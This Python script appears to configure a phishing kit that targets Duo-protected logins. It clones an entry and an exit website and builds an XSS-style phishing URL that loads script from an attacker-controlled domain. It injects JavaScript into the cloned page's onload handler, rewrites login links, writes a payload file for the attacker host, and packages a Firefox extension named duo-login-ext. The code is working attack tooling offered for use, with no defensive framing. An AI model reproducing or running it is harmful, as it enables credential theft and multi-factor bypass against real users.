import os 
from bs4 import BeautifulSoup as bs
import sys

prefix = "./client/public/"
if len(sys.argv) < 3:
	print("Usage: configure.py entry-url exit-url [-y/n]overwrite [host-domain] [path to profiles.ini]")
	sys.exit(0)

entry_url = sys.argv[1]
exit_url = sys.argv[2]

domain = ""
if len(sys.argv) == 5: domain = sys.argv[4]

def get_bool(msg):
	inp = ""
	while not (inp == "y" or inp == "n"):
		if len(sys.argv) == 3:
			inp = input(msg) 
		else:
			if sys.argv[3] == "-y":
				inp = "y"
			elif sys.argv[3] == "-n":
				inp = "n"
			else:
				sys.argv = sys.argv[0:3]
	return [True if inp == "y" else False][0]

print("Entry URL:", entry_url)
if get_bool("Fetch/Overwrite Entry URL site? y/n"):
	os.system("rm -rf {0}entry-site && mkdir -p {0}entry-site && cd {0}entry-site && wget -E -nH --cut-dirs=100 -k -K -p {1}".format(prefix, entry_url))

print("Exit URL:", exit_url)
if get_bool("Fetch/Overwrite Exit URL site? y/n"):
	os.system("rm -rf {0}exit-site && mkdir -p {0}exit-site && cd {0}exit-site && wget -E -nH --cut-dirs=100 -k -K -p {1}".format(prefix, entry_url))
	index = exit_url.split("/")[-1]
	if not index.endswith(".html"):
		print("Warning, assuming html exit site index file...")
		if index == "": index = "index"
		index += ".html"
	os.system("mv {0}exit-site/{1} {0}exit-site/final.html".format(prefix, index))

if domain == "": domain = input("Domain name that redirects to this machine? Example: hacker.ml. Domain: ")

phishing_url = "/".join(entry_url.split("/")[0:4]) + "/%3cscript%20src=%68ttps%3a" + domain + "/"

print("Redirection domain:", domain)
print("Patching Entry Site...")
index = entry_url.split("/")[-1]
if not index.endswith(".html"):
	print("Warning, assuming html entry site index file...")
	if index == "": index = "index"
	index += ".html"

print("Patching index file: " + prefix + "entry-site/" + index)
with open(prefix + "entry-site/" + index, "r+") as index_file:
	patch_js = ""
	with open(prefix + "../patch.js", "r") as patch_file:
		patch_js = patch_file.read()
	html = index_file.read()
	soup = bs(html, "html.parser")
	soup.body["onload"] = "var ORIG_DOM='{}';\
		var FINAL_DOM='{}';\
		var DOMAIN='https://{}';\
		var PHISHING_URL='{}';\
		{}".format(entry_url, exit_url, domain, phishing_url, patch_js)
	for link in soup.find_all('a'):
		if "href" in link.attrs.keys() and "loginaction" in link["href"]:
			del link["href"]
			link["onclick"] = "window.nextWin()"
			link["style"] = "cursor:pointer"
	#html = html.replace("<body", '<body onload="' + patch_js + '"')
	index_file.seek(0, os.SEEK_SET)
	index_file.write(str(soup))

with open(prefix + "../payload.js", "r") as payload_template_file:
	payload = payload_template_file.read()
	attack_url = "https://" + domain + "/entry-site/" + index
	payload = "var ATTACK_DOM='{}';var ORIG_DOM='{}' {}".format(attack_url, entry_url, payload) 
	os.system("mkdir -p " + prefix + "\\'\\<")
	with open(prefix + "'</pre", "w") as payload_file:
		payload_file.write(payload)	

firefox_path = os.path.join(os.environ['HOME'], ".mozilla/firefox")
if len(sys.argv) == 6: firefox_path = sys.argv[5]

print("Verifyng that firefox profiles.ini is at:", firefox_path)
with open(firefox_path + "/profiles.ini", "r") as firefox_ini:
	firefox_ini.read()

print("Writing Configuration to config.ini...")
print("Phishing URL:", phishing_url)
print("Attacker Domain Name:", domain)
with open("config.ini", "w") as cfg_file:
	cfg_file.write(phishing_url + "\n" + domain + "\n" + firefox_path)

print("Preparing firefox plugin zip...")
os.system("cd ./backend/containers/firefox/duo-login-ext && ./make-zip.sh")

print("Creating docker container dir...")
os.system("mkdir /docker")
os.system("mkdir /docker/appdata")

print("\nFinished configuring!")


